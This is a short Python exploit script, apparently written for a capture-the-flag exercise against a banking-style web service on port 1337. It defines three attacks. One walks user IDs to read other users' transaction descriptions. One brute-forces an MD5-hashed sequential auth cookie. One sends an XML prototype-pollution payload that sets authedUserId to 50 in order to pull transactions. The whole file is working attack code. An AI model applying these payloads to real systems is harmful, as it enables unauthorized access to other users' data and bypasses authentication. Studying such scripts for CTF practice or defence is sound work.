import secrets
import requests
from api import API
import hashlib


#IP="10.60.1.4"
IP="localhost"

def generate_string(length=16) -> str:
    return secrets.token_hex(length)


def generate_creds() -> tuple:
    return generate_string(8), generate_string(), generate_string()


def first_vuln():
    api = API(IP, 1337)
    l, p, idnum = generate_creds()
    api.signup(l, p, idnum)
    for i in range(1, 20):
        try:
            print(api._session.get(f"http://{IP}:1337/transaction?usr={i}").json()["data"]["received"][0]["description"])
        except:
            continue

def second_vuln():
    api = API(IP, 1337)
    l, p, idnum = generate_creds()
    api.signup(l, p, idnum)
    auth_cookie = api._session.cookies.get_dict()["auth"]
    for i in range(0, 100000):
        if hashlib.md5(f'{i}'.encode()).hexdigest() == auth_cookie:
            print(f"STATE: {i}")
            break

def third_vuln():
    api = API(IP, 1337)
    l, p, idnum = generate_creds()
    api.signup(l, p, idnum)
    for i in range(1, 100):
        try:
            rsp = api._session.post(
                f"http://{IP}:1337/transaction-info",
                headers={'Content-Type': 'application/xml'},
                # for user with id 50 can brute transactions
                data=f"""<?xml version="1.0" encoding="UTF-8"?>
                <__proto__>
                    <authedUserId>50</authedUserId>
                </__proto__>
                <xml>
                    <transaction_id>{i}</transaction_id>
                </xml>
                """)
            print(rsp.status_code)
        except:
            continue

if __name__ == "__main__":
    third_vuln()
